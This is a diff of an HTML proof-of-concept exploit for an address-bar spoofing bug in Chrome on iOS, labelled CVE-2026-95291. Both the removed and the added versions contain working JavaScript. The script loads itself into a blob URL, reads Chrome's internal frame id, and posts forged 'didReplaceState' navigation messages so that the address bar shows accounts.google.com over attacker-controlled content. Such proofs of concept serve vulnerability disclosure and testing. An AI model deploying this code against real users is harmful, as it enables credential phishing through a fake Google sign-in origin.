@@ -1,105 +1,80 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Address-bar spoof PoC</title>
+<title>CVE-2026-95291 Test PoC</title>
 <style>
-  body { font-family: -apple-system, sans-serif; margin: 2em; background: #ffe0e0; }
-  #banner { border: 3px solid #c00; padding: 1em; background: #fff; }
-  #diag { font-family: Menlo, monospace; font-size: 11px; margin-top: 2em; white-space: pre-wrap; color: #444; }
-  h1 { color: #c00; }
+  body { font-family: -apple-system, sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
+  .card { background: #fff; padding: 1.5em; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+  button { font-size: 16px; padding: 0.6em 1.2em; background: #007aff; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+  button:hover { background: #005bb5; }
+  #diag { font-family: Menlo, monospace; font-size: 12px; margin-top: 1.5em; white-space: pre-wrap; background: #eee; padding: 1em; border-radius: 4px; }
 </style>
-<div id=banner>
-  <h1>Address-bar spoof PoC</h1>
-  <p><b>Bug reproduced</b> if the address bar above shows <b>accounts.google.com</b> (with the lock icon and no <code>blob:</code> prefix) while this attacker-controlled content is displayed.</p>
-  <p>This document's real origin is <code id=real></code>.</p>
+<div class="card">
+  <h2>CVE-2026-95291 Verification PoC</h2>
+  <p>Test if iOS Chrome allows cross-origin blob history state manipulation.</p>
+  <button id="go">Run Exploit Test</button>
+  <pre id="diag">Status: Ready.</pre>
 </div>
-<pre id=diag></pre>
+
 <script>
-(function(){
-  var log = function(m){
-    document.getElementById('diag').textContent += m + '\n';
-    try { console.log('[poc] ' + m); } catch(e){}
-  };
-  document.getElementById('real').textContent = location.origin || '(opaque)';
-  log('location.href = ' + location.href);
-  log('document.baseURI = ' + document.baseURI);
-
-  // 1. Feature-detect: khusus untuk Chrome pada iOS (WKWebView + NavigationJavaScriptFeature)
-  var mh = (window.webkit && window.webkit.messageHandlers) || {};
-  if (!mh.NavigationEventMessage) {
-    log('SKIP: window.webkit.messageHandlers.NavigationEventMessage absent');
-    return;
-  }
-  log('NavigationEventMessage handler present');
-
-  // 2. Membaca frame_id dari page-world __gCrWeb
-  var fid = null;
-  try {
-    var g = window.__gCrWeb;
-    if (g && typeof g.getFrameId === 'function') {
-      fid = g.getFrameId();
-      log('__gCrWeb.getFrameId() = ' + fid);
-    }
-  } catch (e) { log('__gCrWeb.getFrameId() threw: ' + e); }
-  
-  if (!fid) {
-    var tries = [
-      function(){ return window.__gCrWeb.common.getFrameId(); },
-      function(){ return window.__gCrWeb.message.getFrameId(); },
-      function(){ return window.__gCrWeb.frameId; },
-    ];
-    for (var i = 0; i < tries.length && !fid; i++) {
-      try { fid = tries[i](); log('fallback['+i+'] -> ' + fid); } catch(e){}
-    }
-  }
-
-  if (!fid) {
-    log('FAIL: could not read page-world frame_id');
-    return;
-  }
-
-  // 3. Memaksa registrasi frame untuk mengatasi race condition timing
-  var reg = function(){
-    var tried = [
-      function(){ window.__gCrWeb.registerFrame(); },
-      function(){ window.__gCrWeb.crweb.registerFrame(); },
-    ];
-    for (var i = 0; i < tried.length; i++) {
-      try { tried[i](); log('registerFrame() via path['+i+']'); return; }
-      catch(e){}
-    }
-    log('registerFrame() not reachable');
-  };
-  reg();
-
-  // 4. Mengirimkan perintah willChangeState dan didReplaceState lintas domain
-  var VICTIM = 'accounts.google.com';
-  var spoof = 'blob:https://' + VICTIM + '/signin';
-  
-  var post = function(attempt){
-    var f = fid;
-    try { f = window.__gCrWeb.getFrameId() || fid; } catch(e){}
-    try {
-      mh.NavigationEventMessage.postMessage({
-        command: 'willChangeState', frame_id: f,
-      });
-      mh.NavigationEventMessage.postMessage({
-        command: 'didReplaceState', frame_id: f,
-        stateObject: '', baseUrl: 'https://x/',
-        pageUrl: spoof,
-      });
-      log('['+attempt+'] posted didReplaceState fid='+f.slice(0,8)+' pageUrl='+spoof);
-    } catch (e) { log('['+attempt+'] postMessage threw: ' + e); }
-  };
-
-  post(0);
-  setTimeout(function(){ reg(); post(1); }, 150);
-  setTimeout(function(){ post(2); }, 500);
-  setTimeout(function(){ post(3); }, 1200);
-})();
-
-// Auto-packaging dinamis ke dalam kontainer Blob URL jika belum aktif
-if (!location.href.startsWith('blob:')) {
-  var blob = new Blob([document.documentElement.outerHTML], { type: 'text/html' });
-  location.href = URL.createObjectURL(blob);
+function log(m) {
+    document.getElementById('diag').textContent += '\n' + m;
+    console.log('[poc] ' + m);
 }
+
+document.getElementById('go').onclick = function() {
+    document.getElementById('diag').textContent = 'Starting test...';
+    
+    // Target victim domain to spoof
+    var VICTIM = 'accounts.google.com';
+    var spoofUrl = 'blob:https://' + VICTIM + '/signin';
+
+    // Inner code for the blob document
+    var blobHtml = `<!doctype html>
+    <meta charset=utf-8>
+    <script>
+    setTimeout(function() {
+        var mh = window.webkit && window.webkit.messageHandlers;
+        if (!mh || !mh.NavigationEventMessage) {
+            parent.postMessage('RESULT: SAFE (Handler missing or not iOS Chrome)', '*');
+            return;
+        }
+        
+        var fid = null;
+        try {
+            fid = window.__gCrWeb && window.__gCrWeb.getFrameId();
+        } catch(e) {}
+
+        if (!fid) {
+            parent.postMessage('RESULT: SAFE (Could not retrieve frame_id)', '*');
+            return;
+        }
+
+        try {
+            // Attempting the forged state replacement attack
+            mh.NavigationEventMessage.postMessage({ command: 'willChangeState', frame_id: fid });
+            mh.NavigationEventMessage.postMessage({ 
+                command: 'didReplaceState', 
+                frame_id: fid, 
+                stateObject: '', 
+                baseUrl: 'https://x/', 
+                pageUrl: '${spoofUrl}' 
+            });
+            parent.postMessage('RESULT: SENT (Check if address bar changed to ${VICTIM})', '*');
+        } catch(err) {
+            parent.postMessage('RESULT: SAFE (Post failed: ' + err.message + ')', '*');
+        }
+    }, 200);
+    <\/script>`;
+
+    // Create blob and navigate/iframe into it to test behavior
+    var blob = new Blob([blobHtml], {type: 'text/html'});
+    var blobUrl = URL.createObjectURL(blob);
+
+    window.addEventListener('message', function(e) {
+        log(e.data);
+    });
+
+    log('Navigating to blob URL: ' + blobUrl);
+    location.href = blobUrl;
+};
 </script>
